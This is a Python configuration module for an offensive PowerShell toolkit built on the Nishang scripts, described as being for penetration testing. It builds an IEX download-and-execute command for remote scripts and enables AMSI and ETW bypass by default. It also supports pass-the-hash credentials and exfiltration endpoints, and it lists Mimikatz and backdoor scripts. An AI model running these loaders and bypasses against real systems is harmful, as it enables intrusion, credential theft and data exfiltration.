"""
PowerShell Arsenal Configuration

Configuration and settings for PowerShell script integration.
A collection of offensive PowerShell scripts and payloads for
penetration testing and red teaming.

Supports:
- Local script execution from cloned repository
- Remote IEX loading from GitHub
- WinRM remote execution to Windows targets

Usage:
    from aipt_v2.tools.ps_arsenal import PSArsenalConfig, get_ps_config

    config = get_ps_config(
        scripts_path="/path/to/scripts",
        target="10.0.0.1"
    )
"""

import os
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import List, Optional, Dict, Any


class PSLoadMode(Enum):
    """How to load PowerShell scripts."""
    LOCAL_FILE = "local"        # Load from local .ps1 file
    REMOTE_IEX = "remote_iex"   # IEX download from URL
    EMBEDDED = "embedded"       # Embedded script content (cached)


class PSCategory(Enum):
    """PowerShell script categories."""
    GATHER = "Gather"
    SHELLS = "Shells"
    UTILITY = "Utility"
    BACKDOORS = "Backdoors"
    CLIENT = "Client"
    ESCALATION = "Escalation"
    EXECUTION = "Execution"
    SCAN = "Scan"
    PIVOT = "Pivot"
    MITM = "MITM"
    ACTIVE_DIRECTORY = "ActiveDirectory"
    BYPASS = "Bypass"
    MISC = "Misc"
    PRASADHAK = "Prasadhak"
    ANTAK = "Antak-WebShell"
    POWERPRETER = "powerpreter"


class RequiredPrivilege(Enum):
    """Required privilege level for script execution."""
    NONE = "none"       # No special privileges
    USER = "user"       # Standard user context
    ADMIN = "admin"     # Local administrator
    SYSTEM = "system"   # SYSTEM privileges


@dataclass
class PSCredentials:
    """Credentials for PowerShell remote operations."""
    username: str = ""
    password: str = ""
    domain: str = ""
    ntlm_hash: str = ""

    def __post_init__(self):
        """Load from environment if not provided."""
        if not self.username:
            self.username = os.getenv("PS_USERNAME", os.getenv("AD_USERNAME", ""))
        if not self.password:
            self.password = os.getenv("PS_PASSWORD", os.getenv("AD_PASSWORD", ""))
        if not self.domain:
            self.domain = os.getenv("PS_DOMAIN", os.getenv("AD_DOMAIN", ""))
        if not self.ntlm_hash:
            self.ntlm_hash = os.getenv("AD_NTLM_HASH", "")

    def has_credentials(self) -> bool:
        """Check if valid credentials exist."""
        return bool(
            (self.username and self.password) or
            (self.username and self.ntlm_hash)
        )

    def get_formatted_user(self) -> str:
        """Get formatted username with domain."""
        if self.domain:
            return f"{self.domain}\\{self.username}"
        return self.username


@dataclass
class PSArsenalConfig:
    """PowerShell Arsenal execution configuration."""

    # Script location
    scripts_path: str = ""              # Path to local scripts
    base_url: str = ""                  # GitHub raw URL for remote loading

    # Execution mode
    load_mode: PSLoadMode = PSLoadMode.LOCAL_FILE

    # Target information
    target_host: str = ""               # Target machine IP/hostname

    # Remote execution (WinRM)
    use_winrm: bool = False             # Execute on remote via WinRM
    winrm_port: int = 5985              # WinRM port (5985 HTTP, 5986 HTTPS)
    winrm_ssl: bool = False             # Use SSL for WinRM

    # Credentials
    credentials: PSCredentials = field(default_factory=PSCredentials)

    # Scripts to run
    enabled_scripts: List[str] = field(default_factory=list)
    enabled_categories: List[PSCategory] = field(default_factory=list)

    # Security options
    bypass_amsi: bool = True            # Attempt AMSI bypass
    bypass_etw: bool = True             # Attempt ETW bypass
    amsi_technique: str = "reflection"  # AMSI bypass technique

    # Execution options
    timeout: int = 300                  # Default timeout in seconds
    script_timeout: int = 120           # Per-script timeout
    noninteractive: bool = True         # Run non-interactively

    # Output settings
    output_dir: str = "./ps_arsenal_results"
    save_output: bool = True
    verbose: bool = False

    # Exfiltration options (for scripts that support it)
    exfil_option: str = ""              # pastebin, gmail, webserver, dns
    exfil_url: str = ""                 # Exfiltration endpoint

    def __post_init__(self):
        """Initialize from environment."""
        if not self.scripts_path:
            self.scripts_path = os.getenv("PS_SCRIPTS_PATH", "/tmp/ps_arsenal")
        if not self.base_url:
            self.base_url = os.getenv(
                "PS_BASE_URL",
                "https://raw.githubusercontent.com/samratashok/nishang/master"
            )

        # Ensure output directory exists
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)

    def get_script_path(self, category: str, script_name: str) -> Path:
        """Get local path to a PowerShell script."""
        if not script_name.endswith(".ps1"):
            script_name = f"{script_name}.ps1"
        return Path(self.scripts_path) / category / script_name

    def get_script_url(self, category: str, script_name: str) -> str:
        """Get remote URL for a PowerShell script."""
        if not script_name.endswith(".ps1"):
            script_name = f"{script_name}.ps1"
        return f"{self.base_url}/{category}/{script_name}"

    def get_loader_command(self, category: str, script_name: str) -> str:
        """Get PowerShell command to load a script."""
        if self.load_mode == PSLoadMode.LOCAL_FILE:
            script_path = self.get_script_path(category, script_name)
            return f". '{script_path}'"

        elif self.load_mode == PSLoadMode.REMOTE_IEX:
            url = self.get_script_url(category, script_name)
            return f"IEX (New-Object Net.WebClient).DownloadString('{url}')"

        return ""

    def is_configured(self) -> bool:
        """Check if PowerShell Arsenal is properly configured."""
        if self.load_mode == PSLoadMode.LOCAL_FILE:
            return bool(self.scripts_path and Path(self.scripts_path).exists())
        return True  # Remote mode doesn't need local scripts

    def requires_admin(self, script_name: str) -> bool:
        """Check if script requires admin privileges."""
        admin_scripts = {
            "Invoke-Mimikatz",
            "Get-PassHashes",
            "Get-LSASecret",
            "Copy-VSS",
            "Enable-DuplicateToken",
            "Invoke-PsUACme",
            "Invoke-PowerShellIcmp",
            "Add-RegBackdoor",
            "Add-ConstrainedDelegationBackdoor",
            "Set-DCShadowPermissions",
        }
        return script_name in admin_scripts


@dataclass
class PSScanConfig:
    """Configuration for PSArsenalScanner integration."""
    scripts_path: str = ""
    base_url: str = "https://raw.githubusercontent.com/samratashok/nishang/master"
    load_mode: PSLoadMode = PSLoadMode.LOCAL_FILE
    bypass_amsi: bool = True
    scripts_to_run: List[str] = field(default_factory=lambda: [
        "Get-Information",
        "Check-VM",
    ])
    timeout: int = 300
    output_dir: str = "./ps_arsenal_results"

    def __post_init__(self):
        if not self.scripts_path:
            self.scripts_path = os.getenv("PS_SCRIPTS_PATH", "/tmp/ps_arsenal")


def get_ps_config(
    scripts_path: Optional[str] = None,
    target_host: Optional[str] = None,
    username: Optional[str] = None,
    password: Optional[str] = None,
    domain: Optional[str] = None,
    **kwargs
) -> PSArsenalConfig:
    """
    Create PSArsenalConfig from parameters and environment.

    Args:
        scripts_path: Path to local script clone
        target_host: Target machine IP/hostname
        username: Username for operations
        password: Password for authentication
        domain: Domain name
        **kwargs: Additional configuration options

    Returns:
        PSArsenalConfig instance
    """
    credentials = PSCredentials(
        username=username or os.getenv("PS_USERNAME", ""),
        password=password or os.getenv("PS_PASSWORD", ""),
        domain=domain or os.getenv("PS_DOMAIN", ""),
        ntlm_hash=kwargs.get("ntlm_hash", os.getenv("AD_NTLM_HASH", ""))
    )

    # Determine load mode
    if scripts_path and Path(scripts_path).exists():
        load_mode = PSLoadMode.LOCAL_FILE
    else:
        load_mode = PSLoadMode.REMOTE_IEX

    return PSArsenalConfig(
        scripts_path=scripts_path or os.getenv("PS_SCRIPTS_PATH", "/tmp/ps_arsenal"),
        base_url=kwargs.get("base_url", "https://raw.githubusercontent.com/samratashok/nishang/master"),
        load_mode=load_mode,
        target_host=target_host or "",
        use_winrm=kwargs.get("use_winrm", False),
        winrm_port=kwargs.get("winrm_port", 5985),
        winrm_ssl=kwargs.get("winrm_ssl", False),
        credentials=credentials,
        enabled_scripts=kwargs.get("enabled_scripts", []),
        enabled_categories=kwargs.get("enabled_categories", []),
        bypass_amsi=kwargs.get("bypass_amsi", True),
        bypass_etw=kwargs.get("bypass_etw", True),
        timeout=kwargs.get("timeout", 300),
        script_timeout=kwargs.get("script_timeout", 120),
        output_dir=kwargs.get("output_dir", "./ps_arsenal_results"),
        verbose=kwargs.get("verbose", False)
    )


def validate_ps_config(config: PSArsenalConfig) -> Dict[str, Any]:
    """
    Validate PowerShell Arsenal configuration.

    Args:
        config: PSArsenalConfig to validate

    Returns:
        Dict with validation results
    """
    results = {
        "valid": False,
        "errors": [],
        "warnings": []
    }

    # Check script availability for local mode
    if config.load_mode == PSLoadMode.LOCAL_FILE:
        if not config.scripts_path:
            results["errors"].append("Script path not specified for local execution")
        elif not Path(config.scripts_path).exists():
            results["errors"].append(f"Scripts repository not found: {config.scripts_path}")
        elif not Path(config.scripts_path).is_dir():
            results["errors"].append(f"Script path is not a directory: {config.scripts_path}")

    # Check WinRM credentials
    if config.use_winrm:
        if not config.credentials.has_credentials():
            results["errors"].append("WinRM enabled but no credentials provided")
        if not config.target_host:
            results["errors"].append("WinRM enabled but no target host specified")

    # Check admin requirements
    admin_scripts = [s for s in config.enabled_scripts if config.requires_admin(s)]
    if admin_scripts:
        results["warnings"].append(
            f"Scripts requiring admin: {', '.join(admin_scripts)}"
        )

    # Check exfiltration config
    if config.exfil_option and config.exfil_option != "dns":
        if not config.exfil_url:
            results["warnings"].append(
                f"Exfiltration option '{config.exfil_option}' set but no URL provided"
            )

    # All good
    if not results["errors"]:
        results["valid"] = True

    return results


__all__ = [
    "PSArsenalConfig",
    "PSCredentials",
    "PSCategory",
    "PSLoadMode",
    "PSScanConfig",
    "RequiredPrivilege",
    "get_ps_config",
    "validate_ps_config",
]
